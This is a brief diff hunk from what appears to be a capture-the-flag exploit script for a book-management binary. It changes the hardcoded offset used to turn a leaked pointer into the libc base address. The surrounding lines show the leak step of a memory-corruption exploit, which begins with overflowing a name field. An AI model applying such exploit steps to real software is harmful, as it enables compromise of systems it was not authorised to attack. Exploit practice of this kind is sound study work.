@@ -65,7 +65,7 @@ changename("a"*32)
 # leak libc base
 book_id_1, book_name, book_des, book_author = printbook(1)
 call_back = u64(book_name.ljust(8,"\0"))
-offset = 0x5ac010
+offset = 0x5ab010
 libc_base = call_back - offset
 log.success("libc_base is ->" + hex(libc_base))
 
